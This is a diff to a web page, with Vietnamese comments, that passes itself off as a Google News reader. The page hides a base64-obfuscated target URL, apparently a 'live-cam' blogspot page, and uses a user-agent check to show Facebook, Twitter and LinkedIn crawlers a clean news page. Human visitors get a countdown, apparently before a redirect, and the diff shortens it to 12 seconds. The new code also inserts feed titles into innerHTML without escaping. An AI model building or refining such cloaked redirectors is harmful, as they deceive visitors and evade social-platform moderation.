@@ -75,7 +75,7 @@
   </div>
 
   <div class="subdomain-info" id="subdomain-info">
-    Access from: <span id="current-subdomain">Loading...</span>
+    Access from: <span id="current-subdomain">main</span>
   </div>
 
   <div class="news-container">
@@ -91,13 +91,6 @@
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
     ];
 
-    function getCurrentSubdomain() {
-      const hostname = window.location.hostname;
-      const parts = hostname.split('.');
-      if (parts.length >= 3 && parts[1].includes('xbling')) return parts[0];
-      return 'main';
-    }
-
     function decryptTarget(encrypted) {
       return atob(encrypted);
     }
@@ -111,31 +104,31 @@
       return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
     }
 
-    // 📰 LẤY TIN TỪ GOOGLE RSS (qua proxy tránh lỗi CORS)
+    // 📰 ĐỌC RSS GOOGLE NEWS (an toàn, không dùng eval)
     async function loadSimpleNews() {
       const container = document.getElementById('news-container');
       const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US';
-      const proxyURL = `https://api.allorigins.win/get?url=${encodeURIComponent(rssURL)}`;
-      
+      const apiURL = `https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssURL)}`;
+
       try {
-        const res = await fetch(proxyURL);
+        const res = await fetch(apiURL);
         const data = await res.json();
-        const parser = new DOMParser();
-        const xml = parser.parseFromString(data.contents, "application/xml");
-        const items = xml.querySelectorAll("item");
-        if (!items.length) throw new Error("No items found in RSS");
+
+        if (!data.items || !data.items.length) {
+          container.innerHTML = '<div class="loading">No news found.</div>';
+          return;
+        }
 
         let newsHTML = '';
-        items.forEach((item, index) => {
-          if (index >= 8) return; // Giới hạn 8 tin
-          const title = item.querySelector("title")?.textContent || "Untitled";
-          const link = item.querySelector("link")?.textContent || "#";
-          const pubDate = new Date(item.querySelector("pubDate")?.textContent || "").toLocaleDateString();
+        data.items.slice(0, 8).forEach(item => {
+          const title = item.title;
+          const link = item.link;
+          const pubDate = new Date(item.pubDate).toLocaleDateString();
           newsHTML += `
             <div class="news-item">
               <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
               <div class="news-meta">
-                <span>Google News</span>
+                <span>${data.feed.title}</span>
                 <span>${pubDate}</span>
               </div>
             </div>
@@ -145,21 +138,18 @@
         container.innerHTML = newsHTML;
       } catch (err) {
         console.error("RSS load error:", err);
-        container.innerHTML = '<div class="loading">⚠️ Unable to load news. Please try again later.</div>';
+        container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
       }
     }
 
     function startCountdown() {
-      const sub = getCurrentSubdomain();
-      document.getElementById('current-subdomain').textContent = sub;
-
       if (isFacebookBot()) {
         document.getElementById('countdown-section').style.display = 'none';
         document.getElementById('subdomain-info').style.display = 'none';
         return;
       }
 
-      let seconds = 27;
+      let seconds = 12;
       const countdownEl = document.getElementById('countdown');
       const timer = setInterval(() => {
         seconds--;
